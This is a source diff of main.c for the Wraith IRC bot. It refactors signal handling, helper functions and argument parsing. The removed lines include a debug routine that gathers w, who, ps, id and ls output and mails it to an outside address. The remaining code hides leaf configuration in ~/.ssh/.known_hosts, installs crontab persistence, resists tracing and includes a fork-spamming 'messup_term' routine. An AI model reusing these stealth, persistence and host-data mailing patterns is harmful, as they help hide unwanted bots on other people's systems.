@@ -1,7 +1,6 @@
 /*
  * main.c -- handles:
  *   core event handling
- *   signal handling
  *   command line arguments
  *   context and assert debugging
  *
@@ -10,29 +9,26 @@
 #include "main.h"
 #include "build.h"
 #include <libgen.h>
-#include <fcntl.h>
 #include <time.h>
 #include <errno.h>
-#include <signal.h>
 #include <netdb.h>
-#include <setjmp.h>
 #include <unistd.h>
 #include <sys/utsname.h>
 
 #ifdef STOP_UAC				/* osf/1 complains a lot */
-#include <sys/sysinfo.h>
-#define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
-#endif
+# include <sys/sysinfo.h>
+# define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
+#endif /* STOP_UAC */
 /* Some systems have a working sys/wait.h even though configure will
  * decide it's not bsd compatable.  Oh well.
  */
 #include <sys/file.h>
 #include <sys/stat.h>
+#include <sys/types.h>
 #ifdef S_ANTITRACE
 #include <sys/ptrace.h>
 #include <sys/wait.h>
 #endif /* S_ANTITRACE */
-#include <sys/types.h>
 #include <sys/resource.h>
 #include <dirent.h>
 #include <pwd.h>
@@ -40,7 +36,6 @@
 #include "chan.h"
 #include "modules.h"
 #include "tandem.h"
-#include "bg.h"
 
 #ifdef CYGWIN_HACKS
 #include <windows.h>
@@ -59,24 +54,19 @@ int hub = 0;
 int leaf = 1;
 #endif
 
-int localhub = 1; //we set this to 0 if we have -c, later.
 
 extern char		 origbotname[], userfile[], botnetnick[], packname[],
                          shellhash[], myip6[], myip[], hostname[],
                          hostname6[], natip[];
 extern int		 dcc_total, conmask, cache_hit, cache_miss,
-			 fork_interval, 
-                         local_fork_interval;
+			 fork_interval, optind, local_fork_interval;
 extern struct dcc_t	*dcc;
 extern struct userrec	*userlist;
 extern struct chanset_t	*chanset;
 extern Tcl_Interp	*interp;
 extern tcl_timer_t	*timer,
 			*utimer;
-extern jmp_buf		 alarmret;
 
-int 	role;
-int 	loading = 0;
 
 const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
 const char	egg_version[1024] = "1.0.15";
@@ -85,13 +75,17 @@ time_t 	lastfork=0;
 
 #ifdef HUB
 int 	my_port;
-#endif
+#endif /* HUB */
 
+int 	localhub = 1;   	/* we set this to 0 if we have -c, later. */
+int 	role;
+int 	loading = 0;
 char	notify_new[121] = "";	/* Person to send a note to for new users */
 int	default_flags = 0;	/* Default user flags and */
 int	default_uflags = 0;	/* Default userdefinied flags for people
 				   who say 'hello' or for .adduser */
 int	backgrd = 1;		/* Run in the background? */
+int     sdebug = 0;		/* enable debug output? */
 int	con_chan = 0;		/* Foreground: constantly display channel
 				   stats? */
 uid_t   myuid;
@@ -103,7 +97,6 @@ int 	updating = 0; 		/* this is set when the binary is called from itself. */
 char 	tempdir[DIRMAX] = "";
 char 	lock_file[40] = "";
 char 	*binname;
-int     sdebug = 0;		/* enable debug output? */
 char	textdir[121] = "";	/* Directory for text files that get dumped */
 time_t	online_since;		/* Unix-time that the bot loaded up */
 
@@ -125,9 +118,6 @@ time_t	now;			/* duh, now :) */
 extern struct cfg_entry CFG_FORKINTERVAL;
 #define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")
 
-
-unsigned char 	md5out[MD5_HASH_LENGTH + 1];
-char 		md5string[MD5_HASH_LENGTH + 1];
 
 /* Traffic stats
  */
@@ -154,13 +144,72 @@ unsigned long	itraffic_trans_today = 0;
 unsigned long	itraffic_unknown = 0;
 unsigned long	itraffic_unknown_today = 0;
 
-#ifdef DEBUG_CONTEXT
-/* Context storage for fatal crashes */
-char	cx_file[16][30];
-char	cx_note[16][256];
-int	cx_line[16];
-int	cx_ptr = 0;
-#endif
+char *homedir()
+{
+  static char homedir[DIRMAX] = "";
+  if (!homedir || (homedir && !homedir[0])) {
+    char tmp[DIRMAX];
+    struct passwd *pw;
+    sdprintf(STR("If the bot dies after this, try compiling on Debian."));
+    Context;
+    pw = getpwuid(geteuid());
+    sdprintf(STR("End Debian suggestion."));
+
+    if (!pw)
+     werr(ERR_PASSWD);
+    Context;
+    egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
+    Context;
+    realpath(tmp, homedir); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
+  }
+  return homedir;
+}
+
+char *confdir()
+{
+  static char confdir[DIRMAX] = "";
+  if (!confdir || (confdir && !confdir[0])) {
+#ifdef LEAF
+    {
+      egg_snprintf(confdir, sizeof confdir, "%s/.ssh", homedir());
+    }
+#endif /* LEAF */
+#ifdef HUB
+    {
+      char *tmpdir;
+
+      tmpdir = nmalloc(strlen(binname) + 1);
+      strcpy(tmpdir, binname);
+      egg_snprintf(confdir, sizeof confdir, "%s", dirname(tmpdir));
+      nfree(tmpdir);
+    }
+#endif /* HUB */
+  }
+  return confdir;
+}
+
+char *my_uname() 
+{
+  static char os_uname[250] = "";
+  if (!os_uname || (os_uname && !os_uname[0])) {
+    char *unix_n, *vers_n;
+    struct utsname un;
+
+      if (uname(&un) < 0) {
+        unix_n = "*unkown*";
+        vers_n = "";
+      } else {
+        unix_n = un.nodename;
+#ifdef __FreeBSD__
+        vers_n = un.release;
+#else /* __linux__ */
+        vers_n = un.version;
+#endif /* __FreeBSD__ */
+      }
+    egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
+  }
+  return os_uname;
+}
 
 
 void fatal(const char *s, int recoverable)
@@ -183,32 +232,11 @@ void fatal(const char *s, int recoverable)
 #ifdef HAVE_SSL
       ssl_cleanup();
 #endif /* HAVE_SSL */
-
   }
   if (!recoverable) {
     unlink(pid_file);
-    bg_send_quit(BG_ABORT);
     exit(1);
   }
-}
-
-int expmem_chanprog(), expmem_users(), expmem_config(), expmem_misc(), expmem_dccutil(),
- expmem_botnet(), expmem_tcl(), expmem_tclhash(), expmem_net(), expmem_auth(),
- expmem_modules(int), expmem_tcldcc(),
- expmem_tclmisc();
-
-/* For mem.c : calculate memory we SHOULD be using
- */
-
-int expected_memory(void)
-{
-  int tot;
-
-  tot = expmem_chanprog() + expmem_users() + expmem_config() + expmem_misc() +
-    expmem_dccutil() + expmem_botnet() + expmem_tcl() + expmem_tclhash() +
-    expmem_net() + expmem_modules(0) + expmem_tcldcc() + expmem_auth() +
-    expmem_tclmisc();
-  return tot;
 }
 
 static void check_expired_dcc()
@@ -229,283 +257,17 @@ static void check_expired_dcc()
     }
 }
 
-#ifdef DEBUG_CONTEXT
-static int	nested_debug = 0;
-
-void write_debug()
-{
-  int x;
-  char s[25], tmpout[150], buf[DIRMAX];
-  int y;
-
-  if (nested_debug) {
-    /* Yoicks, if we have this there's serious trouble!
-     * All of these are pretty reliable, so we'll try these.
-     *
-     * NOTE: dont try and display context-notes in here, it's
-     *       _not_ safe <cybah>
-     */
-    sprintf(buf, "%sDEBUG.DEBUG", tempdir);
-    x = creat(buf, 0600);
-    setsock(x, SOCK_NONSOCK);
-    if (x >= 0) {
-      strncpyz(s, ctime(&now), sizeof s);
-      dprintf(-x, STR("Debug (%s) written %s\n"), ver, s);
-      dprintf(-x, STR("Context: "));
-      cx_ptr = cx_ptr & 15;
-      for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
-	dprintf(-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
-      dprintf(-x, "%s/%d\n\n", cx_file[y], cx_line[y]);
-      killsock(x);
-      close(x);
+void expire_simuls() {
+  int idx = 0;
+  for (idx = 0; idx < dcc_total; idx++) {
+    if (dcc[idx].simul > 0) {
+      if ((now - dcc[idx].simultime) >= 20) { /* expire simuls after 20 seconds (re-uses idx, so it wont fill up) */
+        dcc[idx].simul = -1;
+        lostdcc(idx);
+      }
     }
-    {
-      /* Use this lame method because shell_exec() or mail() may have caused another segfault :o */
-      char buff[255];
-      egg_snprintf(buff, sizeof(buff), "cat << EOFF >> %sbleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat %s`\nEOFF", tempdir, origbotname, buf);
-      system(buff);
-      egg_snprintf(buff, sizeof(buff), "cat %sbleh |mail wraith@shatow.net", tempdir);
-      system(buff);
-      unlink("bleh");
-    }
-    unlink(buf);
-    bg_send_quit(BG_ABORT);
-    exit(1);			/* Dont even try & tell people about, that may
-				   have caused the fault last time. */
-  } else
-    nested_debug = 1;
-
-  egg_snprintf(tmpout, sizeof tmpout, "* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]",
-                                  cx_file[cx_ptr-2], cx_line[cx_ptr-2], cx_note[cx_ptr-2][0] ? cx_note[cx_ptr-2] : "",
-                                  cx_file[cx_ptr-1], cx_line[cx_ptr-1], cx_note[cx_ptr-1][0] ? cx_note[cx_ptr-1] : "",
-                                  cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
-  putlog(LOG_MISC, "*", "%s", tmpout);
-  printf("%s\n", tmpout);
-  sprintf(buf, "%sDEBUG", tempdir);
-  x = creat(buf, 0600);
-  setsock(x, SOCK_NONSOCK); 
-  if (x < 0) {
-    putlog(LOG_MISC, "*", "* Failed to write DEBUG");
-  } else {
-    char date[80];
-    strncpyz(s, ctime(&now), sizeof s);
-    dprintf(-x, "Debug (%s) written %s\n", ver, s);
-
-    egg_strftime(date, sizeof date, "%c %Z", gmtime(&buildts));
-    dprintf(-x, "Build: %s (%lu)\n", date, buildts);
-    /* info library */
-    dprintf(-x, "Tcl library: %s\n",
-	    ((interp) && (Tcl_Eval(interp, "info library") == TCL_OK)) ?
-	    interp->result : "*unknown*");
-
-    /* info tclversion/patchlevel */
-    dprintf(-x, "Tcl version: %s (header version %s)\n",
-	    ((interp) && (Tcl_Eval(interp, "info patchlevel") == TCL_OK)) ?
-     interp->result : (Tcl_Eval(interp, "info tclversion") == TCL_OK) ?
-     interp->result : "*unknown*", TCL_PATCH_LEVEL ? TCL_PATCH_LEVEL :
-     "*unknown*");
-
-#if HAVE_TCL_THREADS
-    dprintf(-x, "Tcl is threaded\n");
-#endif
-
-#ifdef CCFLAGS
-    dprintf(-x, "Compile flags: %s\n", CCFLAGS);
-#endif
-#ifdef LDFLAGS
-    dprintf(-x, "Link flags: %s\n", LDFLAGS);
-#endif
-#ifdef STRIPFLAGS
-    dprintf(-x, "Strip flags: %s\n", STRIPFLAGS);
-#endif
-
-    dprintf(-x, "Context: ");
-    cx_ptr = cx_ptr & 15;
-    for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
-      dprintf(-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
-	      (cx_note[y][0]) ? cx_note[y] : "");
-    dprintf(-x, "%s/%d [%s]\n\n", cx_file[cx_ptr], cx_line[cx_ptr],
-	    (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
-    tell_dcc(-x);
-    dprintf(-x, "\n");
-    debug_mem_to_dcc(-x);
-    killsock(x);
-    close(x);
-    {
-      char date[81], *w = NULL, *who = NULL, *ps = NULL, *uname = NULL, *id = NULL, *ls = NULL, *debug = NULL, *msg = NULL, buf2[DIRMAX];
-      egg_strftime(date, sizeof date, "%c %Z", gmtime(&now));
-      shell_exec("w", NULL, &w, NULL);
-      shell_exec("who", NULL, &who, NULL);
-      shell_exec("ps cux", NULL, &ps, NULL);
-      shell_exec("uname -a", NULL, &uname, NULL);
-      shell_exec("id", NULL, &id, NULL);
-      shell_exec("ls -al", NULL, &ls, NULL);
-      buf2[0] = 0;
-      sprintf(buf2, "cat %s", buf);
-      shell_exec(buf2, NULL, &debug, NULL);
-      msg = nmalloc(strlen(date) + strlen(id) + strlen(uname) + strlen(w) + strlen(who) + strlen(ps) + strlen(ls) + strlen(debug) + 50);
-      msg[0] = 0;
-      sprintf(msg, "%s\n%s\n%s\n\n%s\n%s\n\n%s\n\n-----%s-----\n\n\n\n%s", date, id, uname, w, who, ps, ls, debug);
-      email("Debug output", msg, EMAIL_TEAM);
-      nfree(msg);
-    }
-    unlink(buf);
-    putlog(LOG_MISC, "*", "* Emailed DEBUG to development team...");
   }
 }
-#endif
-
-static void got_bus(int z)
-{
-#ifdef DEBUG_CONTEXT
-  write_debug();
-#endif
-  fatal(STR("BUS ERROR -- CRASHING!"), 1);
-#ifdef SA_RESETHAND
-  kill(getpid(), SIGBUS);
-#else
-  bg_send_quit(BG_ABORT);
-  exit(1);
-#endif
-}
-
-static void got_segv(int z)
-{
-#ifdef DEBUG_CONTEXT
-  write_debug();
-#endif
-  fatal(STR("SEGMENT VIOLATION -- CRASHING!"), 1);
-#ifdef SA_RESETHAND
-  kill(getpid(), SIGSEGV);
-#else
-  bg_send_quit(BG_ABORT);
-  exit(1);
-#endif
-}
-
-static void got_fpe(int z)
-{
-#ifdef DEBUG_CONTEXT
-  write_debug();
-#endif
-  fatal(STR("FLOATING POINT ERROR -- CRASHING!"), 0);
-}
-
-static void got_term(int z)
-{
-#ifdef HUB
-  write_userfile(-1);
-#endif
-  putlog(LOG_MISC, "*", STR("RECEIVED TERMINATE SIGNAL (IGNORING)"));
-}
-
-static void got_abort(int z)
-{
-#ifdef DEBUG_CONTEXT
-  write_debug();
-#endif
-  fatal(STR("GOT SIGABRT -- CRASHING!"), 1);
-#ifdef SA_RESETHAND
-  kill(getpid(), SIGSEGV);
-#else
-  bg_send_quit(BG_ABORT);
-  exit(1);
-#endif
-}
-
-#ifdef S_HIJACKCHECK
-static void got_cont(int z) 
-{
-  detected(DETECT_SIGCONT, STR("POSSIBLE HIJACK DETECTED"));
-}
-#endif
-
-static void got_quit(int z)
-{
-  putlog(LOG_MISC, "*", STR("RECEIVED QUIT SIGNAL (IGNORING)"));
-  return;
-}
-
-static void got_hup(int z)
-{
-#ifdef HUB
-  write_userfile(-1);
-#endif
-  putlog(LOG_MISC, "*", STR("Received HUP signal: rehashing..."));
-  do_restart = -2;
-  return;
-}
-
-/* A call to resolver (gethostbyname, etc) timed out
- */
-static void got_alarm(int z)
-{
-  longjmp(alarmret, 1);
-
-  /* -Never reached- */
-}
-
-/* Got ILL signal -- log context and continue
- */
-static void got_ill(int z)
-{
-#ifdef DEBUG_CONTEXT
-  putlog(LOG_MISC, "*", STR("* Context: %s/%d [%s]"), cx_file[cx_ptr], cx_line[cx_ptr],
-                         (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
-#endif
-}
-
-#ifdef DEBUG_CONTEXT
-/* Context */
-void eggContext(const char *file, int line, const char *module)
-{
-  char x[31], *p;
-
-  p = strrchr(file, '/');
-  if (!module) {
-    strncpyz(x, p ? p + 1 : file, sizeof x);
-  } else
-    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
-  cx_ptr = ((cx_ptr + 1) & 15);
-  strcpy(cx_file[cx_ptr], x);
-  cx_line[cx_ptr] = line;
-  cx_note[cx_ptr][0] = 0;
-}
-
-/* Called from the ContextNote macro.
- */
-void eggContextNote(const char *file, int line, const char *module,
-		    const char *note)
-{
-  char x[31], *p;
-
-  p = strrchr(file, '/');
-  if (!module) {
-    strncpyz(x, p ? p + 1 : file, sizeof x);
-  } else
-    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
-  cx_ptr = ((cx_ptr + 1) & 15);
-  strcpy(cx_file[cx_ptr], x);
-  cx_line[cx_ptr] = line;
-  strncpyz(cx_note[cx_ptr], note, sizeof cx_note[cx_ptr]);
-}
-#endif
-
-#ifdef DEBUG_ASSERT
-/* Called from the Assert macro.
- */
-void eggAssert(const char *file, int line, const char *module)
-{
-  if (!module)
-    putlog(LOG_MISC, "*", STR("* In file %s, line %u"), file, line);
-  else
-    putlog(LOG_MISC, "*", STR("* In file %s:%s, line %u"), module, file, line);
-#ifdef DEBUG_CONTEXT
-  write_debug();
-#endif /* DEBUG_CONTEXT */
-  fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
-}
-#endif /* DEBUG_ASSERT */
 
 #ifdef LEAF
 static void gotspawn(char *);
@@ -515,18 +277,9 @@ void checkpass()
 {
   static int checkedpass = 0;
   if (!checkedpass) {
-    char *gpasswd;
-    MD5_CTX ctx;
-
-    gpasswd = (char *) getpass("");
-    MD5_Init(&ctx);
-    MD5_Update(&ctx, gpasswd, strlen(gpasswd));
-    MD5_Final(md5out, &ctx);
-    strncpyz(md5string, btoh(md5out, MD5_DIGEST_LENGTH), sizeof(md5string));
-    if (strcmp(shellhash, md5string)) {
+    char *gpasswd = (char *) getpass("");
+    if (md5cmp(shellhash, gpasswd))
       fatal(STR("incorrect password."), 0);
-    }
-    gpasswd = 0;
     checkedpass = 1;
   }
 }
@@ -552,8 +305,23 @@ int clear_tmp()
   return 0;
 }
 
-void got_ed(char *, char *, char *);
-extern int optind;
+void got_ed(char *which, char *in, char *out)
+{
+  sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
+  if (!in || !out)
+    fatal(STR("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>"),0);
+  if (!strcmp(in, out))
+    fatal(STR("<infile> should NOT be the same name as <outfile>"), 0);
+  if (!strcmp(which, "e")) {
+    EncryptFile(in, out);
+    fatal(STR("File Encryption complete"),3);
+  } else if (!strcmp(which, "d")) {
+    DecryptFile(in, out);
+    fatal(STR("File Decryption complete"),3);
+  }
+  exit(0);
+}
+
 char *my_uname();
 
 void gen_conf(char *filename, int type)
@@ -626,33 +394,30 @@ void show_help()
 }
 
 
-char *confdir();
-static void dtx_arg(int argc, char *argv[])
-{
 #ifdef LEAF
-#define PARSE_FLAGS "2c:d:De:Eg:G:L:P:hnstv"
+# define PARSE_FLAGS "2c:d:De:Eg:G:L:P:hnstv"
 #else /* !LEAF */
-#define PARSE_FLAGS "2d:De:Eg:G:hnstv"
+# define PARSE_FLAGS "2d:De:Eg:G:hnstv"
 #endif /* HUB */
 #define FLAGS_CHECKPASS "dDeEgGhntv"
+static void dtx_arg(int argc, char *argv[])
+{
   int i, localhub_pid = 0;
   char *p = NULL;
   while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
     if (strchr(FLAGS_CHECKPASS, i))
       checkpass();
     switch (i) {
-      case '2':
+      case '2':		/* used for testing new binary through update */
         exit(2);
 #ifdef LEAF
       case 'c':
         localhub = 0;
-        if (!localhub)
-          gotspawn(optarg);
+        gotspawn(optarg);
         break;
 #endif /* LEAF */
       case 'h':
         show_help();
-        break; /* never reached */
       case 'g':
         gen_conf(optarg, 1);
       case 'G':
@@ -700,9 +465,7 @@ static void dtx_arg(int argc, char *argv[])
         egg_strftime(date, sizeof date, "%c %Z", gmtime(&buildts));
 	printf("Wraith %s\nBuild Date: %s (%lu)\n", egg_version, date, buildts);
         printf("SALTS\nfiles: %s\nbotlink: %s\n", SALT1, SALT2);
-	bg_send_quit(BG_ABORT);
 	exit(0);
-        break; /* this should never be reached */
       }
 #ifdef LEAF
       case 'L':
@@ -730,67 +493,6 @@ static void dtx_arg(int argc, char *argv[])
 #endif
       default:
         break;
-    }
-  }
-}
-
-#ifdef HUB
-void backup_userfile()
-{
-  char s[DIRMAX], s2[DIRMAX];
-
-  putlog(LOG_MISC, "*", USERF_BACKUP);
-  egg_snprintf(s, sizeof s, "%s.u.0", tempdir);
-  egg_snprintf(s2, sizeof s2, "%s.u.1", tempdir);
-  movefile(s, s2);
-  copyfile(userfile, s);
-}
-#endif /* HUB */
-
-/* Timer info */
-static int		lastmin = 99;
-static time_t		then;
-static struct tm	nowtm;
-
-/* Called once a second.
- *
- * Note:  Try to not put any Context lines in here (guppy 21Mar2000).
- */
-int curcheck = 0;
-
-void core_10secondly()
-{
-  curcheck++;
-#ifdef LEAF
-  if (localhub)
-#endif /* LEAF */
-    check_promisc();
-
-  if (curcheck == 1)
-    check_trace(0);
-
-#ifdef LEAF
-  if (localhub) {
-#endif /* LEAF */
-    if (curcheck==2)
-      check_last();
-    if (curcheck==3) {
-      check_processes();
-      curcheck=0;
-    }
-#ifdef LEAF
-  }
-#endif /* LEAF */
-}
-
-void expire_simuls() {
-  int idx = 0;
-  for (idx = 0; idx < dcc_total; idx++) {
-    if (dcc[idx].simul > 0) {
-      if ((now - dcc[idx].simultime) >= 20) { /* expire simuls after 20 seconds (re-uses idx, so it wont fill up) */
-        dcc[idx].simul = -1;
-        lostdcc(idx);
-      }
     }
   }
 }
@@ -851,6 +553,42 @@ void crazy_trace()
   printf("end\n");
 }
 #endif /* CRAZY_TRACE */
+
+/* Timer info */
+static int		lastmin = 99;
+static time_t		then;
+static struct tm	nowtm;
+
+/* Called once a second.
+ *
+ * Note:  Try to not put any Context lines in here (guppy 21Mar2000).
+ */
+
+int curcheck = 0;
+void core_10secondly()
+{
+  curcheck++;
+#ifdef LEAF
+  if (localhub)
+#endif /* LEAF */
+    check_promisc();
+
+  if (curcheck == 1)
+    check_trace(0);
+
+#ifdef LEAF
+  if (localhub) {
+#endif /* LEAF */
+    if (curcheck==2)
+      check_last();
+    if (curcheck==3) {
+      check_processes();
+      curcheck=0;
+    }
+#ifdef LEAF
+  }
+#endif /* LEAF */
+}
 
 static void core_secondly()
 {
@@ -920,7 +658,7 @@ static void core_secondly()
 #ifdef HUB
 	putlog(LOG_ALL, "*", STR("--- %.11s%s"), s, s + 20);
         backup_userfile();
-#endif
+#endif /* HUB */
       }
     }
     if (nowtm.tm_min == notify_users_at)
@@ -934,7 +672,7 @@ static void core_secondly()
     if (miltime == 300) {
       call_hook(HOOK_DAILY);
     }
-#endif
+#endif /* HUB */
   }
 }
 
@@ -948,9 +686,7 @@ static void check_mypid()
 
   char buf2[DIRMAX];
   egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, botnetnick);
-  fp = fopen(buf2, "r");
-
-  if (fp != NULL) {
+  if ((fp = fopen(buf2, "r"))) {
     fgets(s, 10, fp);
     xx = atoi(s);
     if (getpid() != xx) { //we have a major problem if this is happening..
@@ -960,10 +696,9 @@ static void check_mypid()
         (func[SERVER_NUKESERVER]) ("cloned process");
       }
       botnet_send_bye();
-      bg_send_quit(BG_ABORT);
       exit(1);
     }
-    fclose(fp); //THERE IS THE STUPID BUG OMG
+    fclose(fp);
   }
 }
 #endif
@@ -1033,23 +768,6 @@ void check_static(char *, char *(*)());
 int init_mem(), init_dcc_max(), init_userent(), init_misc(), init_auth(), init_config(), init_bots(),
  init_net(), init_modules(), init_tcl(int, char **), init_botcmd(), init_settings();
 
-void got_ed(char *which, char *in, char *out)
-{
-  sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
-  if (!in || !out)
-    fatal(STR("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>"),0);
-  if (!strcmp(in, out))
-    fatal(STR("<infile> should NOT be the same name as <outfile>"), 0);
-  if (!strcmp(which, "e")) {
-    EncryptFile(in, out);
-    fatal(STR("File Encryption complete"),3);
-  } else if (!strcmp(which, "d")) {
-    DecryptFile(in, out);
-    fatal(STR("File Decryption complete"),3);
-  }
-  exit(0);
-}
-
 static inline void garbage_collect(void)
 {
   static u_8bit_t	run_cnt = 0;
@@ -1076,6 +794,7 @@ int crontab_exists() {
   } else
     return (-1);
 }
+
 void crontab_create(int interval) {
   char tmpfile[161],
     buf[256];
@@ -1126,11 +845,9 @@ static void check_crontab()
   if (!localhub) 
     fatal(STR("something is wrong."), 0);
 #endif /* LEAF */
-  i=crontab_exists();
-  if (!i) {
+  if (!(i = crontab_exists())) {
     crontab_create(5);
-    i=crontab_exists();
-    if (!i)
+    if (!(i = crontab_exists())) 
       printf(STR("* Error writing crontab entry.\n"));
   }
 }
@@ -1221,18 +938,19 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
 #ifdef S_MESSUPTERM 
 void messup_term() {
   int i;
-  char * argv[4];
-  freopen(STR("/dev/null"), "w", stderr);
-  for (i=0;i<11;i++) {
+  char *argv[4];
+
+  freopen("/dev/null", "w", stderr);
+  for (i = 0; i < 11; i++) {
     fork();
   }
-  argv[0]=nmalloc(100);
-  strcpy(argv[0], STR("/bin/sh"));
-  argv[1]="-c";
-  argv[2]=nmalloc(1024);
-  strcpy(argv[2], STR("cat < "));
+  argv[0] = nmalloc(100);
+  strcpy(argv[0], "/bin/sh");
+  argv[1] = "-c";
+  argv[2] = nmalloc(1024);
+  strcpy(argv[2], "cat < ");
   strcat(argv[2], binname);
-  argv[3]=NULL;
+  argv[3] = NULL;
   execvp(argv[0], &argv[0]);
 }
 #endif /* S_MESSUPTERM */
@@ -1320,69 +1038,6 @@ void check_trace_start()
 #endif /* S_ANTITRACE */
 }
 
-char *homedir()
-{
-  static char home[DIRMAX], tmp[DIRMAX];
-  struct passwd *pw;
-  sdprintf(STR("If the bot dies after this, try compiling on Debian."));
-Context;
-  pw = getpwuid(geteuid());
-  sdprintf(STR("End Debian suggestion."));
-
-  if (!pw)
-   werr(ERR_PASSWD);
-Context;
-  egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
-Context;
-  realpath(tmp, home); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
-
-  return home;
-}
-
-char *confdir()
-{
-  static char conf[DIRMAX];
-
-#ifdef LEAF
-{
-  egg_snprintf(conf, sizeof conf, "%s/.ssh", homedir());
-}
-#endif /* LEAF */
-#ifdef HUB
-{
-  char *tmpdir;
-
-  tmpdir = nmalloc(strlen(binname)+1);
-  strcpy(tmpdir, binname);
-  egg_snprintf(conf, sizeof conf, "%s", dirname(tmpdir));
-  nfree(tmpdir);
-}
-#endif /* HUB */
-
-  return conf;
-}
-
-char *my_uname() 
-{
-  static char os_uname[250];
-  char *unix_n, *vers_n;
-  struct utsname un;
-
-    if (uname(&un) < 0) {
-      unix_n = "*unkown*";
-      vers_n = "";
-    } else {
-      unix_n = un.nodename;
-#ifdef __FreeBSD__
-      vers_n = un.release;
-#else
-      vers_n = un.version;
-#endif /* __FreeBSD__ */
-    }
-  egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
-  return os_uname;
-}
-
 int main(int argc, char **argv)
 {
   int xx, i;
@@ -1391,7 +1046,6 @@ int main(int argc, char **argv)
 #endif
   char buf[SGRAB + 9], s[25];
   FILE *f;
-  struct sigaction sv;
 #ifdef LEAF
   int skip = 0;
   int ok = 1;
@@ -1445,40 +1099,7 @@ int main(int argc, char **argv)
   }
 #endif
 
-  /* Set up error traps: */
-  sv.sa_handler = got_bus;
-  sigemptyset(&sv.sa_mask);
-#ifdef SA_RESETHAND
-  sv.sa_flags = SA_RESETHAND;
-#else
-  sv.sa_flags = 0;
-#endif
-  sigaction(SIGBUS, &sv, NULL);
-  sv.sa_handler = got_segv;
-  sigaction(SIGSEGV, &sv, NULL);
-#ifdef SA_RESETHAND
-  sv.sa_flags = 0;
-#endif
-  sv.sa_handler = got_fpe;
-  sigaction(SIGFPE, &sv, NULL);
-  sv.sa_handler = got_term;
-  sigaction(SIGTERM, &sv, NULL);
-#ifdef S_HIJACKCHECK
-  sv.sa_handler = got_cont;
-  sigaction(SIGCONT, &sv, NULL);
-#endif
-  sv.sa_handler = got_abort;
-  sigaction(SIGABRT, &sv, NULL);
-  sv.sa_handler = got_hup;
-  sigaction(SIGHUP, &sv, NULL);
-  sv.sa_handler = got_quit;
-  sigaction(SIGQUIT, &sv, NULL);
-  sv.sa_handler = SIG_IGN;
-  sigaction(SIGPIPE, &sv, NULL);
-  sv.sa_handler = got_ill;
-  sigaction(SIGILL, &sv, NULL);
-  sv.sa_handler = got_alarm;
-  sigaction(SIGALRM, &sv, NULL);
+  init_signals();
 
   Context;
   /* Initialize variables and stuff */
@@ -1520,9 +1141,6 @@ int main(int argc, char **argv)
   }
   if (checktrace)
     check_trace_start();
-
-  if (backgrd)		/* fork() after we check for tracing and check the ARGS */
-    bg_prepare_split();
 
 #ifdef HUB
   egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
@@ -1606,7 +1224,7 @@ int main(int argc, char **argv)
     char cfile[DIRMAX], templine[8192];
 #ifdef LEAF
     egg_snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir());
-#else
+#else /* HUB */
     egg_snprintf(cfile, sizeof cfile, "%s/conf", confdir());
 #endif /* LEAF */
     if (!can_stat(cfile))
@@ -1620,7 +1238,7 @@ int main(int argc, char **argv)
       if (!(f = fopen(cfile, "r")))
          werr(0);
       Context;
-      while(fscanf(f,"%[^\n]\n",templine) != EOF) {
+      while(fscanf(f, "%[^\n]\n", templine) != EOF) {
         char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps, c[1024];
         void *temp_ptr;
         int skip = 0;
@@ -1776,7 +1394,6 @@ int main(int argc, char **argv)
       kill(xx, SIGCHLD);
       if (errno != ESRCH) { //!= is PID is running.
         sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
-        bg_send_quit(BG_ABORT);
         exit(1);
       }
       fclose(f);
